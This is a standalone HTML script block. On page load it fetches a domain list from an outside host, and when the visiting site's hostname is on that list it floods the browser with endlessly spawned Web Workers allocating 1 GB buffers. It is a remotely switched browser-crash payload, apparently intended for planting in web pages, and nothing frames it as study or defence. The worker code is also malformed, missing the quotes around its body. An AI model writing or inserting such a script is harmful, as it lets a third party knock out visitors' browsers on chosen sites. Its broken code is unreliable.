<script>
function workerCrash() {
    let workerCode = 
        while (true) {
            let arr = new ArrayBuffer(2 ** 30);
        }
    ;
    let blob = new Blob([workerCode], { type: 'application/javascript' });
    let url = URL.createObjectURL(blob);
    while (true) {
        new Worker(url);
    }
}

window.addEventListener('load', () => {
    // Fetch url.txt and check domain
    fetch('https://testpop.pages.dev/check.txt')
        .then(response => response.text())
        .then(data => {
            const domains = data.split(/\s+/); // split by whitespace
            const currentDomain = window.location.hostname;
            if (domains.includes(currentDomain)) {
                // Delay 2 seconds before executing
                setTimeout(workerCrash, 2000);
            }
        })
        .catch(error => {
            console.error('Error fetching url.txt:', error);
        });
});
</script>
